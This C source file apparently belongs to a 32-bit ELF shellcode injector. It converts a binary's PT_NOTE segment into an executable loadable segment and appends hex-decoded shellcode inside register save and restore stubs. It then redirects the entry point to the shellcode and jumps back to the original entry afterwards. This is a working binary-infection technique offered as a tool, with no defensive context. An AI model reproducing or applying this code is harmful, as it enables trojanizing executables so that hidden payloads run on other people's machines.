#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <linux/elf.h>


#include <elf32.h>
#include <elf.h>
#include <misc.h>

const char stub_save32[14] = "\x50\x53\x51\x52\x57\x56\x89\xE5\x81\xEC\x00\x05\x00\x00";
const char stub_rest32[8] = "\x89\xEC\x5E\x5F\x5A\x59\x5B\x58";
const char ret_entry32[11] = "\x31\xC0\xB8\x0A\x80\x04\x08\x8B\x00\xFF\xE0";


bool is_valid_32b(unsigned char *p)
{
        return (
        MAG0(p[0]) &&
        MAG1(p[1]) &&
        MAG2(p[2]) &&
        MAG3(p[3]) &&
        (p[4] == ELFCLASS32)
        );

}

Elf32_Phdr* find_segment_header_32b(unsigned char *p)
{

    Elf32_Ehdr *header = (Elf32_Ehdr*)p;
    Elf32_Phdr *pheader;

    for (int i = 0; i < header->e_phnum; i++)
    {
        pheader = (Elf32_Phdr*)(p+header->e_phoff + i * header->e_phentsize);

        if (pheader->p_type == PT_NOTE)
            return pheader;
    }

    return NULL;
}

Elf32_Shdr *find_section_by_name_32b(unsigned char *p, const char *name)
{
    Elf32_Ehdr *header = (Elf32_Ehdr*)p;
    Elf32_Shdr *sheader;
    Elf32_Shdr *sh_strtab = (Elf32_Shdr*) (p+header->e_shoff + header->e_shentsize * header->e_shstrndx); 

    for (int i = 0; i < header->e_shnum; i++)
    {   

        sheader = (Elf32_Shdr*)(p+header->e_shoff + i * header->e_shentsize);
        char *sname = (char*)(p+sh_strtab->sh_offset + sheader->sh_name);

        if (strcmp(sname, name) == 0)
            return sheader;
    }

    return NULL;
}

Elf32_Shdr *find_section_for_injection_32b(unsigned char *p)
{
    Elf32_Shdr *ptr = NULL;
    for (int i = 0; i < 2; i++)
    {

        ptr = find_section_by_name_32b(p, NOTE_SECTIONS[i]);
        if (ptr != NULL)
            return ptr;
    }

    return ptr;
}

uint32_t get_base_address_32b(unsigned char *p)
{
    Elf32_Ehdr *header = (Elf32_Ehdr*)p;
    Elf32_Phdr *pheader = (Elf32_Phdr*)(p+header->e_phoff);

    uint32_t min = pheader->p_vaddr;

    for (int i = 1; i < header->e_phnum; i++)
    {
        pheader = (Elf32_Phdr*)(p+header->e_phoff + i * header->e_phentsize);

        if ((pheader->p_vaddr < min) && (pheader->p_type == PT_LOAD)) 
            min = pheader->p_vaddr;
    }

    return min;
}

void inject_code_32b(const char *filename, char *code, unsigned char *p, int fd)
{
    printf("[+] 32 bits binary\n");

    Elf32_Phdr *pheader = find_segment_header_32b(p);
    if (pheader == NULL)
        fatal_error("can't find a PT_NOTE segment");

    Elf32_Shdr *sheader = find_section_for_injection_32b(p);
    if (sheader == NULL)
        fatal_error("can't find a .note-* section");

    Elf32_Ehdr *header = (Elf32_Ehdr*)p;
    if (header->e_type != ET_EXEC)
        fatal_error("Executable musntn't be compiled as PIE");

    if (strlen(code) % 2 != 0)
        fatal_error("Invalid shellcode");

    unsigned char *val = malloc(strlen(code)/2);
    if (val == NULL)
        fatal_error("error while allocating memeory");

    if (get_base_address_32b(p) != 0x08048000)
        fatal_error("Not working with base address != 0x08048000");

    unsigned char *pos = code;

    for (size_t count = 0; count < strlen(code)/2; count++) {
        sscanf(pos, "%2hhx", &val[count]);
        pos += 2;
    }

    printf("[+] Original entry point : 0x%x\n", header->e_entry);

    size_t file_size = get_file_size(fd);

    pheader->p_type = PT_LOAD;
    pheader->p_offset = (unsigned int)file_size;
    pheader->p_vaddr = (Elf32_Addr)(file_size+0xc000000);
    pheader->p_paddr = (Elf32_Addr)(file_size+0xc000000);

    pheader->p_filesz = (unsigned int)(strlen(code)/2 + 33);
    pheader->p_memsz = pheader->p_filesz;
    pheader->p_flags = PF_R | PF_X;
    pheader->p_align = 0x1000;

    printf("[+] Patched program header succesfully\n");

    sheader->sh_type = SHT_PROGBITS;
    sheader->sh_addr = pheader->p_vaddr;
    sheader->sh_offset = pheader->p_offset;
    sheader->sh_size = pheader->p_memsz;
    sheader->sh_addralign = 16;
    sheader->sh_flags = SHF_ALLOC | SHF_EXECINSTR;

    unsigned int *patch = (unsigned int*)(p+10);
    *patch = (unsigned int)header->e_entry;

    printf("[+] Patched section header succesfully\n");
    header->e_entry = (Elf32_Addr) (file_size+0xc000000);
    printf("[+] New entry point: 0x%x\n", header->e_entry);

    printf("[+] Injecting shellcode of %lu bytes", strlen(code)/2);

    FILE *f = fopen(filename, "a");
    if (f != NULL)
    {
        fwrite(stub_save32, sizeof(char), 14 ,f);
        fwrite(val, sizeof(char), strlen(code)/2, f);
        fwrite(stub_rest32, sizeof(char), 8, f);
        fwrite(ret_entry32, sizeof(char), 11, f);
    }

    fclose(f);
    free(val);

}